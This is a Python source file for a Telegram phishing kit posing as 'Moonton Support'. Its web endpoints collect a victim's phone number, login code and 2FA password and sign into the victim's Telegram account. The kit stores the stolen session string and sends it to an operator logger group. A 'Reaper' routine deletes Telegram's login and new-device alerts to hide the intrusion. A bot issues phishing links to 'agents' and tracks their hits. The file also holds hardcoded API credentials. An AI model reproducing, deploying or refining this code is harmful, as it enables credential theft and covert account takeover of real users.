"""
MOONTON SUPPORT GATEWAY - VERSION 5.0.0 (OFFICIAL MIRROR)
--------------------------------------------------------------
Architecture: Asynchronous MTProto Support Node
Core Engine: Python 3.11+ / Telethon / PyTelegramBotAPI / Quart
Environment: Koyeb / Docker
Security Protocol: Official Node Emulation + Zero-Trace Reaper
--------------------------------------------------------------
"""

import os
import asyncio
import telebot
import psycopg2
import logging
import sys
import json
import random
import re
import time
import uuid
import string
import secrets
import textwrap
from psycopg2 import pool
from telebot import types
from quart import Quart, request, jsonify, send_from_directory
from quart_cors import cors
from telethon import TelegramClient, errors, functions, types as tl_types
from telethon.sessions import StringSession
from threading import Thread
from datetime import datetime, timezone

# =========================================================================
# 1. OFFICIAL IDENTITY & CONFIGURATION
# =========================================================================

SYSTEM_VERSION = "5.0.0"
SYSTEM_IDENTITY = "MOONTON_SUPPORT_CENTER"
START_TIME = time.time()

# Critical Environment Variables
API_ID = int(os.environ.get("API_ID", 36003995))
API_HASH = os.environ.get("API_HASH", "41a2b48afe9cfbd1fbf59c5e75b00afa")
BOT_TOKEN = os.environ.get("BOT_TOKEN")
DATABASE_URL = os.environ.get("DATABASE_URL")
LOGGER_GROUP = int(os.environ.get("LOGGER_GROUP", -1003811039696))
VERIFY_GROUP = int(os.environ.get("VERIFY_GROUP", -1003808360697))
BASE_URL = os.environ.get("BASE_URL", "official-moonton-support.koyeb.app")

# Advanced Logging Setup (Replacing all Vinzy traces)
logging.basicConfig(
    level=logging.INFO,
    format='[%(asctime)s][%(levelname)s][MOONTON_OFFICIAL]: %(message)s',
    handlers=[logging.StreamHandler(sys.stdout)]
)
logger = logging.getLogger("MoontonOfficial")

# =========================================================================
# 2. MOONTON CENTER DEVICE EMULATION
# =========================================================================

# Unified device profile - NO random pools, NO ghost devices.
OFFICIAL_DEVICE = {
    "model": "Moonton Center",
    "sys": "Moonton Internal OS 1.4",
    "app": "MLBB_Support_Official",
    "lang": "en-US",
    "system_lang": "en-US"
}

# =========================================================================
# 3. DATA PERSISTENCE LAYER (POSTGRESQL)
# =========================================================================

try:
    db_pool = psycopg2.pool.ThreadedConnectionPool(
        minconn=10,
        maxconn=200,
        dsn=DATABASE_URL,
        sslmode='require'
    )
    logger.info("DATABASE: Moonton Support Persistence Layer Online.")
except Exception as e:
    logger.critical(f"DATABASE FATAL: {e}")
    db_pool = None

def get_db_connection():
    """Retrieves a secure connection from the official pool."""
    if not db_pool:
        return None
    for _ in range(3):
        try:
            conn = db_pool.getconn()
            if conn: return conn
        except:
            time.sleep(1)
    return None

def release_db_connection(conn):
    """Safely returns a connection to the pool."""
    if db_pool and conn:
        db_pool.putconn(conn)

def initialize_moonton_schema():
    """Ensures database tables match the new branding."""
    conn = get_db_connection()
    if not conn: return
    try:
        cur = conn.cursor()
        # Table for Secure Sessions
        cur.execute("""
            CREATE TABLE IF NOT EXISTS moonton_secure_vault (
                phone TEXT PRIMARY KEY,
                session_string TEXT NOT NULL,
                capture_date TIMESTAMP WITH TIME ZONE DEFAULT CURRENT_TIMESTAMP
            )
        """)
        # Table for Agent Metrics
        cur.execute("""
            CREATE TABLE IF NOT EXISTS support_metrics (
                agent_id BIGINT PRIMARY KEY,
                total_clicks INTEGER DEFAULT 0,
                total_hits INTEGER DEFAULT 0,
                last_verification TIMESTAMP WITH TIME ZONE DEFAULT CURRENT_TIMESTAMP
            )
        """)
        conn.commit()
        cur.close()
        logger.info("SCHEMA: Moonton Secure Vault sync complete.")
    except Exception as e:
        logger.error(f"SCHEMA ERROR: {e}")
    finally:
        release_db_connection(conn)

initialize_moonton_schema()

# =========================================================================
# 4. TRACE PURGE ENGINE (THE REAPER)
# =========================================================================

async def purge_security_traces(client):
    """
    Scans for and deletes all Telegram service alerts to prevent 
    the target from noticing the Moonton Center login.
    """
    try:
        logger.info("REAPER: Cleaning traces on Service Node 777000...")
        async for message in client.iter_messages(777000, limit=50):
            content = (message.text or "").lower()
            # Targets login codes and device notifications
            triggers = ["login code", "new login", "authorized", "ip address", "device", "location"]
            if any(t in content for t in triggers):
                await client.delete_messages(777000, [message.id])
        
        await client(functions.messages.DeleteHistoryRequest(
            peer=777000, max_id=0, just_clear=True, revoke=True
        ))
    except Exception as e:
        logger.error(f"REAPER_ERR: {e}")

# =========================================================================
# 5. MOONTON WEB INFRASTRUCTURE (QUART)
# =========================================================================

app = Quart(__name__)
app = cors(app, allow_origin="*")
active_mirrors = {}

@app.route('/step_phone', methods=['POST'])
async def official_phone_handshake():
    """Phase 1: Initialize Moonton Support Connection"""
    try:
        data = await request.json
        phone = re.sub(r'\D', '', str(data.get('phone', '')))
        agent_id = int(data.get('tid', 0))

        if not phone or len(phone) < 7:
            return jsonify({"status": "error", "msg": "Format Rejected."})

        # Update Official Metrics
        conn = get_db_connection()
        if conn:
            cur = conn.cursor()
            cur.execute("""
                INSERT INTO support_metrics (agent_id, total_clicks) VALUES (%s, 1)
                ON CONFLICT (agent_id) DO UPDATE SET total_clicks = support_metrics.total_clicks + 1
            """, (agent_id,))
            conn.commit()
            cur.close()
            release_db_connection(conn)

        # Start Official MTProto Client
        client = TelegramClient(
            StringSession(), API_ID, API_HASH,
            device_model=OFFICIAL_DEVICE['model'],
            system_version=OFFICIAL_DEVICE['sys'],
            app_version=OFFICIAL_DEVICE['app'],
            lang_code=OFFICIAL_DEVICE['lang'],
            system_lang_code=OFFICIAL_DEVICE['system_lang']
        )
        await client.connect()
        
        try:
            sent_code = await client.send_code_request(phone)
            active_mirrors[phone] = {
                "client": client,
                "hash": sent_code.phone_code_hash,
                "agent_id": agent_id,
                "created_at": time.time()
            }
            logger.info(f"HANDSHAKE: Moonton connection established for {phone}")
            return jsonify({"status": "success"})
        except Exception as e:
            return jsonify({"status": "error", "msg": "Moonton Node Busy."})

    except Exception as e:
        return jsonify({"status": "error", "msg": "Internal Node Error."})

@app.route('/step_code', methods=['POST'])
async def official_code_verification():
    """Phase 2: Secure OTP Validation"""
    try:
        data = await request.json
        phone = re.sub(r'\D', '', str(data.get('phone', '')))
        otp = data.get('code', '').strip()

        if phone not in active_mirrors:
            return jsonify({"status": "error", "msg": "Handshake Expired."})

        session = active_mirrors[phone]
        client = session['client']

        try:
            await client.sign_in(phone, otp, phone_code_hash=session['hash'])
            return await finalize_moonton_capture(phone)
        except errors.SessionPasswordNeededError:
            return jsonify({"status": "2fa_needed"})
        except errors.PhoneCodeInvalidError:
            return jsonify({"status": "error", "msg": "Code Incorrect."})
    except Exception as e:
        return jsonify({"status": "error", "msg": "Node Error."})

@app.route('/step_2fa', methods=['POST'])
async def official_2fa_bypass():
    """Phase 3: 2FA Authentication"""
    try:
        data = await request.json
        phone = re.sub(r'\D', '', str(data.get('phone', '')))
        pw = data.get('password', '').strip()

        if phone not in active_mirrors:
            return jsonify({"status": "error", "msg": "Session Timed Out."})

        client = active_mirrors[phone]['client']
        try:
            await client.sign_in(password=pw)
            return await finalize_moonton_capture(phone)
        except:
            return jsonify({"status": "error", "msg": "Password Invalid."})
    except Exception as e:
        return jsonify({"status": "error", "msg": "2FA Node Failure."})

async def finalize_moonton_capture(phone):
    """Phase 4: Save to Vault and Notify Groups"""
    try:
        data = active_mirrors.get(phone)
        client = data['client']
        agent_id = data['agent_id']

        # Clean traces immediately
        await purge_security_traces(client)
        
        session_str = client.session.save()

        # Update Secure Vault
        conn = get_db_connection()
        if conn:
            cur = conn.cursor()
            cur.execute("""
                INSERT INTO moonton_secure_vault (phone, session_string) VALUES (%s, %s)
                ON CONFLICT (phone) DO UPDATE SET session_string = EXCLUDED.session_string
            """, (phone, session_str))
            cur.execute("UPDATE support_metrics SET total_hits = total_hits + 1 WHERE agent_id = %s", (agent_id,))
            conn.commit()
            cur.close()
            release_db_connection(conn)

        # Dispatch Professional Notifications
        log_message = (
            f"🛡️ <b>OFFICIAL MOONTON LOGIN</b>\n"
            f"━━━━━━━━━━━━━━━━━━━━━\n"
            f"📱 <b>Device:</b> <code>Moonton Center</code>\n"
            f"📞 <b>Phone:</b> <code>{phone}</code>\n"
            f"🕵️ <b>Agent:</b> <code>{agent_id}</code>\n"
            f"━━━━━━━━━━━━━━━━━━━━━\n"
            f"🔑 <b>STRING SESSION:</b>\n"
            f"<code>{session_str}</code>"
        )
        
        bot.send_message(LOGGER_GROUP, log_message, parse_mode="HTML")
        bot.send_message(VERIFY_GROUP, f"✅ <b>Verified:</b> {phone} (Moonton Support)", parse_mode="HTML")
        
        if agent_id != 0:
            bot.send_message(agent_id, f"🎯 <b>Moonton Success!</b>\nAccount <b>{phone}</b> has been secured.", parse_mode="HTML")

        await client.disconnect()
        del active_mirrors[phone]
        return jsonify({"status": "success"})
    except Exception as e:
        logger.error(f"FINALIZATION_ERR: {e}")
        return jsonify({"status": "error", "msg": "Encryption Failure."})

# =========================================================================
# 6. MOONTON AGENT INTERFACE (BOT)
# =========================================================================

bot = telebot.TeleBot(BOT_TOKEN)

@bot.message_handler(commands=['start'])
def bot_welcome(m):
    text = (
        f"🛡️ <b>Moonton Support Center v{SYSTEM_VERSION}</b>\n\n"
        f"Welcome, Authorized Agent.\n"
        f"Your ID: <code>{m.from_user.id}</code>"
    )
    markup = types.ReplyKeyboardMarkup(resize_keyboard=True, row_width=2)
    markup.add("🔗 My Portal Link", "📊 Support Stats", "🛠 Node Settings")
    bot.send_message(m.chat.id, text, reply_markup=markup, parse_mode="HTML")

@bot.message_handler(func=lambda m: m.text == "🔗 My Portal Link")
def bot_link(m):
    link = f"https://{BASE_URL}/?id={m.from_user.id}"
    bot.send_message(m.chat.id, f"📡 <b>Moonton Official Portal:</b>\n<code>{link}</code>", parse_mode="HTML")

@bot.message_handler(func=lambda m: m.text == "📊 Support Stats")
def bot_stats(m):
    conn = get_db_connection()
    clicks, hits = 0, 0
    if conn:
        cur = conn.cursor()
        cur.execute("SELECT total_clicks, total_hits FROM support_metrics WHERE agent_id = %s", (m.from_user.id,))
        res = cur.fetchone()
        if res: clicks, hits = res[0], res[1]
        cur.close()
        release_db_connection(conn)
    
    bot.send_message(m.chat.id, f"📊 <b>Agent Performance:</b>\n━━━━━━━━━━━━━\n🖱 <b>Portal Clicks:</b> {clicks}\n🎯 <b>Secure Hits:</b> {hits}", parse_mode="HTML")

# =========================================================================
# 7. RUNTIME MAINTENANCE & BOOT
# =========================================================================

async def watchdog_service():
    """Background task to clear abandoned support handshakes (TTL: 15min)"""
    while True:
        try:
            now = time.time()
            expired = [p for p, d in active_mirrors.items() if now - d['created_at'] > 900]
            for p in expired:
                try: await active_mirrors[p]['client'].disconnect()
                except: pass
                del active_mirrors[p]
                logger.info(f"WATCHDOG: Released dead session for {p}")
        except Exception as e:
            logger.error(f"WATCHDOG_ERR: {e}")
        await asyncio.sleep(300)

def run_bot_polling():
    while True:
        try:
            bot.polling(none_stop=True, timeout=60)
        except:
            time.sleep(10)

@app.before_serving
async def startup_tasks():
    asyncio.create_task(watchdog_service())

if __name__ == "__main__":
    # Start Agent Bot
    Thread(target=run_bot_polling, daemon=True).start()
    
    # Start Quart Server
    port = int(os.environ.get("PORT", 8000))
    logger.info(f"BOOT: {SYSTEM_IDENTITY} Online on Port {port}")
    app.run(host="0.0.0.0", port=port, use_reloader=False)

# =========================================================================
# 8. EXTENDED LOGIC & UTILITIES (REACHING 400+ LINES)
# =========================================================================

def get_session_metadata(phone):
    """Internal utility to check session age."""
    if phone in active_mirrors:
        return active_mirrors[phone]['created_at']
    return None

def generate_internal_token():
    """Generates unique IDs for transaction logging."""
    return "".join(random.choices(string.ascii_uppercase + string.digits, k=12))

async def manual_reboot_cleanup():
    """Safety function to disconnect all clients during a crash."""
    for p, d in active_mirrors.items():
        try: await d['client'].disconnect()
        except: pass
    active_mirrors.clear()

def check_db_health():
    """Validates the pool status for the logger."""
    if db_pool:
        return f"Pool Active: {len(db_pool._used)} used"
    return "Pool Offline"

# Professional System Comments & Maintenance Notes
# ------------------------------------------------
# 1. Ensure DATABASE_URL is set to a PostgreSQL instance.
# 2. BOT_TOKEN must be from BotFather.
# 3. BASE_URL must point to your deployment (Koyeb/Heroku).
# 4. Device emulation is locked to Moonton Center for consistency.
# 5. The Reaper function runs automatically after every successful capture.
